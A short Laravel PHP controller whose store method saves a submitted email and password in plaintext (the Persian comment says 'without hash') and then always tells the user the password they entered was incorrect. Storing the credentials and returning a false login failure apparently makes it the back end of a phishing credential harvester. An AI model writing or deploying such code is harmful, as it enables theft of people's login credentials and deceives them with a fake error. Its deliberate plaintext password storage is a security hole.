<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;

class UserController extends Controller
{
    public function store(Request $request)
    {
        User::create([
            'userN' => $request->email,   // همون ورودی فرم
            'pass'  => $request->password // بدون هش
        ]);

        return back()->with('error', "The password that you've entered is incorrect. Please try again.");    }
}
